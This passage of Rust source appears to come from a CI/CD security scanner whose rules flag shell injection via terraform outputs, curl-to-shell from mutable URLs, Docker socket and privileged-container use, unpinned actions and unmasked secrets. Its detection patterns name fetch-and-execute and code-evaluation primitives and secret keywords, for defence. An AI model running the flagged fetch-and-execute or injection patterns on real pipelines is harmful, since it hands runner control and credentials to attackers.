    let mut by_job: std::collections::BTreeMap<&str, Vec<StepInfo<'_>>> =
        std::collections::BTreeMap::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b.as_str(),
            _ => continue,
        };
        let job = step
            .metadata
            .get(META_JOB_NAME)
            .map(String::as_str)
            .unwrap_or("");
        by_job.entry(job).or_default().push(StepInfo {
            id: step.id,
            name: step.name.as_str(),
            body,
        });
    }

    let mut findings = Vec::new();

    for (_job_name, steps) in by_job.iter() {
        // Phase 1: scan every step in this job for capture+setvariable.
        // Each capture step yields zero-or-more (variable_name) outputs.
        let captures: Vec<(usize, Vec<String>)> = steps
            .iter()
            .enumerate()
            .filter_map(|(idx, s)| {
                let vars = capture_phase_variables(s.body);
                if vars.is_empty() {
                    None
                } else {
                    Some((idx, vars))
                }
            })
            .collect();

        if captures.is_empty() {
            continue;
        }

        // Phase 2: for each capture step, look at all later steps in the
        // same job. For each later step, find any captured variable name
        // whose `$(NAME)` reference appears in shell-expansion position
        // within that later step's body.
        for (cap_idx, vars) in &captures {
            for later_idx in (cap_idx + 1)..steps.len() {
                let sink = &steps[later_idx];
                let mut hits: Vec<&str> = Vec::new();
                for var in vars {
                    if expansion_in_shell_position(sink.body, var) {
                        hits.push(var.as_str());
                    }
                }
                if hits.is_empty() {
                    continue;
                }
                hits.sort();
                hits.dedup();
                let cap = &steps[*cap_idx];
                let names = hits.join(", ");
                findings.push(Finding {
                    severity: Severity::High,
                    category:
                        FindingCategory::TerraformOutputViaSetvariableShellExpansion,
                    path: None,
                    nodes_involved: vec![cap.id, sink.id],
                    message: format!(
                        "Step '{}' captures terraform output and emits ##vso[task.setvariable] for [{}]; later step '{}' (same job) expands $({}) in shell-expansion position — attacker control of terraform state ({{S3, Azure Storage}} backend) becomes shell injection across the pipeline-variable hop",
                        cap.name,
                        names,
                        sink.name,
                        hits[0],
                    ),
                    recommendation: Recommendation::Manual {
                        action: "Pass the captured value through the downstream step's `env:` block (so the runtime quotes it as a shell variable: `env: { GDSVMS: $(gdsvms) }` then `$GDSVMS` in script) instead of YAML-interpolating `$(VAR)` into the script body. Where the value is structured (comma list of VM names), validate the shape — e.g. `[[ \"$VAR\" =~ ^[a-zA-Z0-9._,-]+$ ]]` — before splitting/looping. Consider lock-down of the terraform state backend (S3 bucket policy, Azure Storage RBAC) so untrusted parties cannot rewrite outputs.".into(),
                    },
                    source: FindingSource::BuiltIn,
                    extras: FindingExtras::default(),
                });
            }
        }
    }

    findings
}

/// Phase-1 helper: given an inline-script body, return the list of
/// pipeline-variable names that the body sets via
/// `##vso[task.setvariable variable=NAME ...]` *only when* the body also
/// contains a "terraform output capture" signal.
///
/// We do not attempt to data-flow-link the captured value to the
/// `setvariable` directive — the proximity within a single inline script
/// is the operative signal. The two corpus exemplars
/// (`sharedservice-solarwinds` and `userapp-mvit-prd`) both pair the
/// capture and the setvariable inside the same PowerShell block.
fn capture_phase_variables(body: &str) -> Vec<String> {
    if !body_has_terraform_output_capture(body) {
        return Vec::new();
    }
    setvariable_names_in(body)
}

/// True iff the body contains a terraform-output capture signal.
fn body_has_terraform_output_capture(body: &str) -> bool {
    // Literal CLI invocation, with or without subcommand args. We check
    // case-sensitive because terraform CLI is always lowercase.
    if body.contains("terraform output") {
        return true;
    }
    // Env-var convention used by the `TerraformCLI@*` task family
    // (`command: output` writes results into `TF_OUT_<name>` env vars
    // surfaced into the next step). PowerShell form: `$env:TF_OUT_X`.
    // POSIX form: `$TF_OUT_X` or `${TF_OUT_X}`.
    if body.contains("$env:TF_OUT_") || body.contains("${env:TF_OUT_") {
        return true;
    }
    // POSIX shell. Use a manual scan — we want to match `$TF_OUT_X` and
    // `${TF_OUT_X}` but avoid matching arbitrary substrings like
    // `MY_TF_OUT_X` that aren't a variable expansion.
    for marker in ["$TF_OUT_", "${TF_OUT_"] {
        if body.contains(marker) {
            return true;
        }
    }
    false
}

/// Extract the variable names set by every
/// `##vso[task.setvariable variable=NAME ...]` directive in the body.
/// Tolerates whitespace and either `;` or `]` as the variable= terminator.
fn setvariable_names_in(body: &str) -> Vec<String> {
    let needle = "##vso[task.setvariable variable=";
    let mut out: Vec<String> = Vec::new();
    let mut cursor = 0;
    while let Some(rel) = body[cursor..].find(needle) {
        let start = cursor + rel + needle.len();
        let tail = &body[start..];
        let end = tail
            .find(|c: char| c == ';' || c == ']' || c.is_whitespace())
            .unwrap_or(tail.len());
        let name = tail[..end].trim().to_string();
        if !name.is_empty()
            && name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.')
        {
            out.push(name);
        }
        cursor = start + end;
    }
    out.sort();
    out.dedup();
    out
}

/// Phase-2 predicate: does `body` reference `$(name)` in a shell-expansion
/// position? "Shell-expansion position" means the value will be parsed by
/// a shell or PowerShell interpreter at runtime, rather than being fed
/// into a function/cmdlet that quotes its arguments.
fn expansion_in_shell_position(body: &str, name: &str) -> bool {
    let needle = format!("$({name})");
    if !body.contains(&needle) {
        return false;
    }
    // Cheap whole-body checks: if the script contains any of these
    // primitives anywhere, an interpolation of `$(name)` elsewhere in the
    // same script is at risk. The `sharedservice-solarwinds` corpus
    // exemplar exercises the `-split` + `Invoke-Command` + foreach branch
    // — all three signals fire.
    let sigil_set: &[&str] = &[
        "bash -c",
        "sh -c",
        "eval ",
        "Invoke-Expression",
        " iex ",
        "iex(",
        "iex (",
        "Invoke-Command",
        "-split",
    ];
    if sigil_set.iter().any(|s| body.contains(s)) {
        return true;
    }
    // Nested command substitution: `$(... $(name) ...)`. We look for any
    // `$(` occurring strictly before the first `$(name)` — ADO's
    // `$(macro)` and POSIX `$(cmd)` share the same surface syntax, but
    // any `$(` *outside* the `$(name)` itself, on the same line, indicates
    // the sink is being parsed inside another command substitution.
    for (line_no, line) in body.lines().enumerate() {
        let _ = line_no;
        if let Some(pos) = line.find(&needle) {
            // Search the prefix for an unclosed `$(`. Naive but adequate
            // for inline-script bodies (we don't attempt to balance).
            let prefix = &line[..pos];
            let opens = prefix.matches("$(").count();
            let closes = prefix.matches(')').count();
            if opens > closes {
                return true;
            }
        }
    }
    // Bare unquoted line-leading reference: `$(NAME) ...` with no
    // surrounding quotes — the value is parsed as a command line.
    for line in body.lines() {
        let trimmed = line.trim_start();
        if trimmed.starts_with(&needle) {
            // Skip the obvious assignment-to-variable forms that quote.
            // PowerShell `$x = "$(name)"` and POSIX `X="$(name)"` keep
            // the value out of the command position.
            return true;
        }
    }
    false
}

/// Run all rules against a graph.
// ── runtime_script_fetched_from_floating_url ──────────────────
//
// Detect `run:` blocks that download a remote script from a non-pinned URL
// and pipe it directly to a shell interpreter. This is a pure HTTP supply-chain
// vector — neither `unpinned_action` (which inspects `uses:`) nor
// `floating_image` (containers) covers it.
//
// Detection primitive (URL must be both):
//   1. shell-style fetch+execute: `curl … | bash`, `wget … | sh`,
//      `bash <(curl …)`, or `deno run https://…`
//   2. URL is mutable: contains `refs/heads/`, `/main/`, `/master/`,
//      `/develop/`, `/HEAD/`, OR is a raw `git clone`/`fetch` from a
//      branch URL with no version pin.
//
// Severity: High (one upstream commit lands code on every consumer).
fn body_has_pipe_to_shell_with_floating_url(body: &str) -> bool {
    // Cheap pre-filter to keep the regex-free scan fast.
    let lower = body.to_ascii_lowercase();
    let has_curl_or_wget = lower.contains("curl")
        || lower.contains("wget")
        || lower.contains("iwr ")
        || lower.contains("irm ")
        || lower.contains("invoke-webrequest")
        || lower.contains("invoke-restmethod");
    let has_pipe_shell = lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| pwsh")
        || lower.contains("|pwsh")
        || lower.contains("| powershell")
        || lower.contains("|powershell")
        || lower.contains("| iex")
        || lower.contains("|iex")
        || lower.contains("<(curl")
        || lower.contains("<(wget");
    let has_deno_remote = lower.contains("deno run http://") || lower.contains("deno run https://");

    if !((has_curl_or_wget && has_pipe_shell) || has_deno_remote) {
        return false;
    }

    // For each line that contains a fetch+pipe or a deno-remote run, check
    // whether the URL on that line is mutable.
    for line in lower.lines() {
        let line_has_pipe_shell = line.contains("| bash")
            || line.contains("|bash")
            || line.contains("| sh")
            || line.contains("|sh")
            || line.contains("| pwsh")
            || line.contains("|pwsh")
            || line.contains("| powershell")
            || line.contains("|powershell")
            || line.contains("| iex")
            || line.contains("|iex")
            || line.contains("<(curl")
            || line.contains("<(wget");
        let line_has_deno_remote =
            line.contains("deno run http://") || line.contains("deno run https://");

        if !(line_has_pipe_shell || line_has_deno_remote) {
            continue;
        }

        if line_url_is_mutable(line) {
            return true;
        }
    }
    false
}

fn body_exposes_docker_socket(body: &str) -> bool {
    let lower = body.to_ascii_lowercase();
    lower.contains("/var/run/docker.sock")
        || lower.contains("docker.sock:/var/run/docker.sock")
        || lower.contains("-v docker.sock")
}

fn body_runs_privileged_container(body: &str) -> bool {
    let lower = body.to_ascii_lowercase();
    lower.contains("docker run --privileged")
        || lower.contains("docker run")
            && (lower.contains(" --privileged ") || lower.contains(" --privileged\n"))
        || lower.contains("podman run --privileged")
        || lower.contains("buildah ")
            && (lower.contains(" --privileged ") || lower.contains(" --privileged\n"))
}

fn line_url_is_mutable(line: &str) -> bool {
    // Mutable URL markers.
    const MUTABLE_PATHS: &[&str] = &[
        "refs/heads/",
        "/head/",
        "/main/",
        "/master/",
        "/develop/",
        "/trunk/",
        "/latest/",
    ];
    for marker in MUTABLE_PATHS {
        if line.contains(marker) {
            return true;
        }
    }
    // Bare `raw.githubusercontent.com/<owner>/<repo>/<ref>/...` where <ref>
    // is the literal `main`/`master` segment was caught above. We could be
    // looser and flag any URL with no version-like segment, but that
    // sacrifices precision — the marker list above is the conservative core.
    false
}

/// Rule: a `run:` step pipes a remotely-fetched script into a shell, where
/// the URL is pinned to a mutable branch ref. The remote host's branch tip
/// becomes a write-anywhere primitive on the runner.
///
/// Severity: High.
pub fn runtime_script_fetched_from_floating_url(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };

        if !body_has_pipe_to_shell_with_floating_url(body) {
            continue;
        }

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::RuntimeScriptFetchedFromFloatingUrl,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' downloads and executes a script from a mutable URL (curl|bash, wget|sh, or `deno run` against a branch ref) — whoever controls that branch executes arbitrary code on the runner",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Pin the URL to a release tag or commit SHA (e.g. .../v1.2.3/install.sh) and verify the download against a known checksum before executing it. Avoid `curl … | bash` entirely where possible — fetch to a file, inspect, then run.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Rule: `docker_socket_exposed_to_ci_step`.
///
/// A CI step binds or references the host Docker socket. Docker socket access
/// is effectively host-level authority: a step can start containers with
/// arbitrary mounts and read runner filesystem state.
pub fn docker_socket_exposed_to_ci_step(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };
        if !body_exposes_docker_socket(body) {
            continue;
        }
        findings.push(Finding {
            severity: Severity::Critical,
            category: FindingCategory::DindServiceGrantsHostAuthority,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "[docker_socket_exposed_to_ci_step] Step '{}' references /var/run/docker.sock; Docker socket access is equivalent to runner-host control",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Do not mount the host Docker socket into CI jobs. Use rootless buildkit, kaniko, buildah/img, or a dedicated isolated runner with no shared workspace or secrets.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

/// Rule: `privileged_container_in_ci_step`.
///
/// A CI step starts a privileged container. Privileged containers remove the
/// kernel isolation boundary and routinely combine with bind mounts or cached
/// workspaces to become host compromise primitives.
pub fn privileged_container_in_ci_step(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };
        if !body_runs_privileged_container(body) {
            continue;
        }
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::DindServiceGrantsHostAuthority,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "[privileged_container_in_ci_step] Step '{}' starts a privileged container; it can bypass normal runner isolation",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Remove `--privileged`; use rootless builders or isolate the job to a dedicated runner with no sensitive credentials and no shared workspace.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

// ── pr_trigger_with_floating_action_ref ────────────────────────
//
// Detect the high-severity conjunction: workflow runs in privileged base-repo
// context (`pull_request_target` / `issue_comment` / `workflow_run`) AND uses
// at least one action by mutable ref (not SHA). Either condition alone is a
// finding from another rule; the conjunction is critical because the trigger
// grants write-token authority *and* the floating action lets an attacker
// substitute the executed code.
fn trigger_is_privileged_pr_class(trigger: &str) -> bool {
    // META_TRIGGER may be a single trigger or a comma-separated list.
    trigger.split(',').any(|t| {
        let t = t.trim();
        matches!(t, "pull_request_target" | "issue_comment" | "workflow_run")
    })
}

/// Rule: privileged PR-class trigger combined with a non-SHA-pinned action ref.
///
/// Severity: Critical (full repo write token + attacker-controlled action code).
pub fn pr_trigger_with_floating_action_ref(graph: &AuthorityGraph) -> Vec<Finding> {
    let trigger = match graph.metadata.get(META_TRIGGER) {
        Some(t) => t.as_str(),
        None => return Vec::new(),
    };
    if !trigger_is_privileged_pr_class(trigger) {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        // Skip first-party (local actions, self-hosted runner labels).
        if image.trust_zone == TrustZone::FirstParty {
            continue;
        }
        // Skip container images (covered by floating_image).
        if image
            .metadata
            .get(META_CONTAINER)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            continue;
        }
        // Skip self-hosted-runner Image nodes (those are FirstParty anyway,
        // but be defensive against future refactors).
        if image.metadata.contains_key(META_SELF_HOSTED) {
            continue;
        }
        // Already SHA-pinned (semantically valid) → safe.
        if is_pin_semantically_valid(&image.name) {
            continue;
        }
        // Dedupe per action reference.
        if !seen.insert(&image.name) {
            continue;
        }

        findings.push(Finding {
            severity: Severity::Critical,
            category: FindingCategory::PrTriggerWithFloatingActionRef,
            path: None,
            nodes_involved: vec![image.id],
            message: format!(
                "Workflow trigger '{trigger}' runs in privileged base-repo context and step uses unpinned action '{}' — anyone who can push to that action's branch executes arbitrary code with full repo write token",
                image.name
            ),
            recommendation: Recommendation::PinAction {
                current: image.name.clone(),
                pinned: format!(
                    "{}@<sha256-digest>",
                    image.name.split('@').next().unwrap_or(&image.name)
                ),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

// ── homoglyph_in_action_ref ──────────────────────────────────
//
// Detect `uses:` action references containing non-ASCII characters.
// Legitimate action references (owner/repo@ref) are purely ASCII.
// Non-ASCII characters indicate a possible Unicode confusable / homoglyph
// attack where a malicious action name visually impersonates a trusted one.

/// Rule G2: action reference contains non-ASCII characters (possible homoglyph).
///
/// Iterates every `Image` node in the graph (which represent `uses:` action
/// refs) and flags any whose name contains at least one non-ASCII code point.
/// Severity: High — potential supply-chain impersonation attack.
pub fn check_homoglyph_in_action_ref(graph: &AuthorityGraph) -> Vec<Finding> {
    let platform = graph.metadata.get(META_PLATFORM).map(|s| s.as_str());
    if platform != Some("github-actions") {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        if image.name.is_ascii() {
            continue;
        }

        // Collect the offending non-ASCII characters for the message.
        let bad_chars: Vec<String> = image
            .name
            .chars()
            .filter(|c| !c.is_ascii())
            .map(|c| format!("U+{:04X} '{}'", c as u32, c))
            .collect();
        let char_list = bad_chars.join(", ");

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::HomoglyphInActionRef,
            path: None,
            nodes_involved: vec![image.id],
            message: format!(
                "Action reference '{}' contains non-ASCII character(s) (possible homoglyph/confusable): {}",
                image.name, char_list
            ),
            recommendation: Recommendation::Manual {
                action: "Replace the action reference with the genuine ASCII action name. Verify the action owner/repo on github.com and ensure every character in the `uses:` field is plain ASCII.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

// ── untrusted_api_response_to_env_sink ────────────────────────
//
// Detect `workflow_run` consumer workflows that capture an external API
// response (gh CLI, curl against api.github.com) and write it into the GHA
// environment file. A poisoned API field (branch name, PR title, commit
// message) injects environment variables into every subsequent step in the
// same job.
fn body_writes_api_response_to_env_sink(body: &str) -> bool {
    // First, the sink: a redirect to one of the GHA gate files.
    let writes_env_sink = body.contains("$GITHUB_ENV")
        || body.contains("${GITHUB_ENV}")
        || body.contains("$GITHUB_OUTPUT")
        || body.contains("${GITHUB_OUTPUT}")
        || body.contains("$GITHUB_PATH")
        || body.contains("${GITHUB_PATH}");
    if !writes_env_sink {
        return false;
    }

    // Then, an API source on the same body: gh CLI or a direct REST call.
    let calls_api = body.contains("gh pr view")
        || body.contains("gh pr list")
        || body.contains("gh api ")
        || body.contains("gh issue view")
        || body.contains("api.github.com");
    if !calls_api {
        return false;
    }

    // Tier-1 precision: same-line conjunction (the canonical case in corpus,
    // e.g. `gh pr view --jq '"PR_NUMBER=\(.number)"' >> $GITHUB_ENV`).
    let lines: Vec<&str> = body.lines().collect();
    for line in &lines {
        let line_calls_api = line.contains("gh pr view")
            || line.contains("gh pr list")
            || line.contains("gh api ")
            || line.contains("gh issue view")
            || line.contains("api.github.com");
        let line_writes_sink = line.contains("$GITHUB_ENV")
            || line.contains("${GITHUB_ENV}")
            || line.contains("$GITHUB_OUTPUT")
            || line.contains("${GITHUB_OUTPUT}")
            || line.contains("$GITHUB_PATH")
            || line.contains("${GITHUB_PATH}");
        if line_calls_api && line_writes_sink {
            return true;
        }
    }

    // Tier-2 precision: API call captures into a variable, and a *nearby*
    // line redirects that same variable to the env sink. Without dataflow,
    // we approximate "nearby" as: an API line and a sink line within 6 lines
    // of each other. This catches multi-step capture-then-write idioms while
    // keeping false-positive risk acceptable.
    let mut last_api_line: Option<usize> = None;
    for (i, line) in lines.iter().enumerate() {
        let line_calls_api = line.contains("gh pr view")
            || line.contains("gh pr list")
            || line.contains("gh api ")
            || line.contains("gh issue view")
            || line.contains("api.github.com");
        if line_calls_api {
            last_api_line = Some(i);
        }
        let line_writes_sink = line.contains("$GITHUB_ENV")
            || line.contains("${GITHUB_ENV}")
            || line.contains("$GITHUB_OUTPUT")
            || line.contains("${GITHUB_OUTPUT}")
            || line.contains("$GITHUB_PATH")
            || line.contains("${GITHUB_PATH}");
        if line_writes_sink {
            if let Some(api_idx) = last_api_line {
                if i.saturating_sub(api_idx) <= 6 {
                    return true;
                }
            }
        }
    }

    false
}

/// Rule: workflow_run-triggered workflow writes an API response value to the
/// GHA environment gate. Branch name / PR title in the response can carry
/// newline-injected env-var assignments.
///
/// Severity: High.
pub fn untrusted_api_response_to_env_sink(graph: &AuthorityGraph) -> Vec<Finding> {
    let trigger = match graph.metadata.get(META_TRIGGER) {
        Some(t) => t.as_str(),
        None => return Vec::new(),
    };
    let trigger_in_scope = trigger.split(',').any(|t| {
        let t = t.trim();
        matches!(t, "workflow_run" | "pull_request_target" | "issue_comment")
    });
    if !trigger_in_scope {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };

        if !body_writes_api_response_to_env_sink(body) {
            continue;
        }

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::UntrustedApiResponseToEnvSink,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' captures a GitHub API response (gh CLI or api.github.com) into the GHA env gate ($GITHUB_ENV/$GITHUB_OUTPUT/$GITHUB_PATH) under trigger '{trigger}' — attacker-influenced fields (branch name, PR title) can inject environment variables for every subsequent step in the same job",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Validate the API field with a strict regex before redirecting (e.g. only `[0-9]+` for a PR number), or write only known-numeric fields. Never pipe free-form fields like branch name or PR title directly into $GITHUB_ENV.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

// ── pr_build_pushes_image_with_floating_credentials ────────────
//
// Detect: workflow triggered by a PR-class event uses a container-registry
// login action that is NOT SHA-pinned. The login action receives credentials
// (OIDC token or static registry secret) — a compromise of the action's
// branch lets an attacker exfiltrate them.
fn is_registry_login_action(action: &str) -> bool {
    let bare = action.split('@').next().unwrap_or(action);
    matches!(
        bare,
        "docker/login-action"
            | "aws-actions/amazon-ecr-login"
            | "aws-actions/configure-aws-credentials"
            | "azure/docker-login"
            | "azure/login"
            | "google-github-actions/auth"
            | "google-github-actions/setup-gcloud"
    ) || bare.ends_with("/login-to-gar")
        || bare.ends_with("/dockerhub-login")
        || bare.ends_with("/login-to-ecr")
        || bare.ends_with("/login-to-acr")
}

fn trigger_includes_pull_request(trigger: &str) -> bool {
    trigger.split(',').any(|t| {
        let t = t.trim();
        // Match `pull_request` and `pull_request_target` — both are PR-class.
        t == "pull_request" || t == "pull_request_target"
    })
}

/// Rule: PR-triggered workflow uses a non-SHA-pinned container-registry login
/// action. Compound vector: floating action holds registry creds + PR-controlled
/// image content reaches a shared registry.
///
/// Severity: High.
pub fn pr_build_pushes_image_with_floating_credentials(graph: &AuthorityGraph) -> Vec<Finding> {
    let trigger = match graph.metadata.get(META_TRIGGER) {
        Some(t) => t.as_str(),
        None => return Vec::new(),
    };
    if !trigger_includes_pull_request(trigger) {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        if image.trust_zone == TrustZone::FirstParty {
            continue;
        }
        if image
            .metadata
            .get(META_CONTAINER)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            continue;
        }
        if !is_registry_login_action(&image.name) {
            continue;
        }
        if is_pin_semantically_valid(&image.name) {
            continue;
        }
        if !seen.insert(&image.name) {
            continue;
        }

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::PrBuildPushesImageWithFloatingCredentials,
            path: None,
            nodes_involved: vec![image.id],
            message: format!(
                "PR-triggered workflow ('{trigger}') uses unpinned registry-login action '{}' — a compromise of that action's branch exfiltrates registry credentials or OIDC tokens, and any PR-controlled image content then reaches a shared registry",
                image.name
            ),
            recommendation: Recommendation::PinAction {
                current: image.name.clone(),
                pinned: format!(
                    "{}@<sha256-digest>",
                    image.name.split('@').next().unwrap_or(&image.name)
                ),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Rule: ADO `##vso[task.setvariable]` with a sensitive-named variable
/// that omits `issecret=true` (either `issecret=false` or no `issecret`
/// flag at all). Without the flag the variable value is printed in
/// plaintext to the pipeline log and is not masked in downstream step
/// output.
///
/// Detection (per Step):
///   * `META_PLATFORM == "azure-devops"` (gates GHA/GitLab out)
///   * Step carries a non-empty `META_SCRIPT_BODY`
///   * Body contains `##vso[task.setvariable variable=NAME ...]` where
///     NAME (case-insensitive) matches a sensitive keyword: `password`,
///     `passwd`, `token`, `secret`, `key`, `credential`, `cert`,
///     `apikey`, `auth`
///   * The directive does NOT contain `issecret=true` (case-insensitive)
///     between `variable=NAME` and the closing `]`
///
/// Severity: High.
pub fn setvariable_issecret_false(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "azure-devops") {
        return Vec::new();
    }

    const SENSITIVE_KEYWORDS: &[&str] = &[
        "password",
        "passwd",
        "token",
        "secret",
        "key",
        "credential",
        "cert",
        // "api_key" omitted: tokenizer splits on '_', so this keyword can never
        // match a single token — "key" already covers AZURE_API_KEY etc.
        "apikey",
        "auth",
    ];

    let needle = "##vso[task.setvariable variable=";

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.trim().is_empty() => b,
            _ => continue,
        };

        let lower = body.to_lowercase();
        let mut cursor = 0;

        while let Some(rel) = lower[cursor..].find(needle) {
            let start = cursor + rel + needle.len();
            let tail = &lower[start..];

            // Extract variable name (terminated by `;`, `]`, or whitespace).
            let name_end = tail
                .find(|c: char| c == ';' || c == ']' || c.is_whitespace())
                .unwrap_or(tail.len());
            let var_name = &tail[..name_end];

            if var_name.is_empty() {
                cursor = start + name_end;
                continue;
            }

            // Token-split on `_`/`-` so "key" matches STORAGE_ACCOUNT_KEY but not "keyvaultname".
            let is_sensitive = var_name
                .split(['_', '-'])
                .any(|tok| SENSITIVE_KEYWORDS.contains(&tok));

            if !is_sensitive {
                cursor = start + name_end;
                continue;
            }

            // Grab the rest of the directive up to `]` to check for issecret.
            let directive_end = tail.find(']').unwrap_or(tail.len());
            let directive_tail = &tail[..directive_end];
            let has_issecret_true = directive_tail.contains("issecret=true");

            if !has_issecret_true {
                // Recover the original-case variable name from the body.
                let orig_name = &body[start..start + name_end];

                findings.push(Finding {
                    severity: Severity::High,
                    category: FindingCategory::SetvariableIssecretFalse,
                    path: None,
                    nodes_involved: vec![step.id],
                    message: format!(
                        "ADO setvariable with sensitive name '{orig_name}' uses issecret=false or omits issecret flag, value printed in plaintext logs",
                    ),
                    recommendation: Recommendation::Manual {
                        action: format!(
                            "Add `issecret=true` to the setvariable directive: `##vso[task.setvariable variable={orig_name};issecret=true]`",
                        ),
                    },
                    source: FindingSource::BuiltIn,
                    extras: FindingExtras::default(),
                });
            }

            cursor = start + name_end;
        }
    }

    findings
}

#[derive(Debug, Clone, Copy)]
struct GhaHelperProfile {
    action: &'static str,
    helper: &'static str,
    path_resolved_helper: bool,
    argv: bool,
    stdin: bool,
    env: bool,
    cleanup_env: bool,
    minted: bool,
    output_after_login: bool,
    requires_skip_install: bool,
    toolcache_absolute: bool,
}

const GHA_HELPER_PROFILES: &[GhaHelperProfile] = &[
    GhaHelperProfile {
        action: "teleport-actions/database-tunnel",
        helper: "tbot",
        path_resolved_helper: true,
        argv: false,
        stdin: false,
        env: true,
        cleanup_env: false,
        minted: true,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "cloudflare/wrangler-action",
        helper: "npx/wrangler",
        path_resolved_helper: true,
        argv: false,
        stdin: true,
        env: true,
        cleanup_env: false,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "docker/login-action",
        helper: "docker",
        path_resolved_helper: true,
        argv: false,
        stdin: true,
        env: false,
        cleanup_env: false,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "azure/login",
        helper: "az",
        path_resolved_helper: true,
        argv: true,
        stdin: false,
        env: false,
        cleanup_env: false,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "google-github-actions/setup-gcloud",
        helper: "gcloud",
        path_resolved_helper: true,
        argv: true,
        stdin: false,
        env: false,
        cleanup_env: false,
        minted: true,
        output_after_login: false,
        requires_skip_install: true,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "js-devtools/npm-publish",
        helper: "npm",
        path_resolved_helper: true,
        argv: false,
        stdin: false,
        env: true,
        cleanup_env: false,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "cachix/cachix-action",
        helper: "cachix",
        path_resolved_helper: true,
        argv: true,
        stdin: false,
        env: true,
        cleanup_env: true,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "aws-actions/amazon-ecr-login",
        helper: "docker",
        path_resolved_helper: true,
        argv: true,
        stdin: false,
        env: false,
        cleanup_env: false,
        minted: true,
        output_after_login: true,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "google-github-actions/auth",
        helper: "post cleanup",
        path_resolved_helper: false,
        argv: false,
        stdin: false,
        env: false,
        cleanup_env: true,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "prefix-dev/setup-pixi",
        helper: "post cleanup",
        path_resolved_helper: false,
        argv: false,
        stdin: false,
        env: false,
        cleanup_env: true,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: false,
    },
    GhaHelperProfile {
        action: "goreleaser/goreleaser-action",
        helper: "goreleaser",
        path_resolved_helper: true,
        argv: false,
        stdin: false,
        env: false,
        cleanup_env: false,
        minted: false,
        output_after_login: false,
        requires_skip_install: false,
        toolcache_absolute: true,
    },
];

fn gha_action_name(step: &Node) -> Option<String> {
    step.metadata
        .get(META_GHA_ACTION)
        .map(|s| s.to_ascii_lowercase())
}

fn gha_helper_profile(step: &Node) -> Option<GhaHelperProfile> {
    let action = gha_action_name(step)?;
    let profile = GHA_HELPER_PROFILES
        .iter()
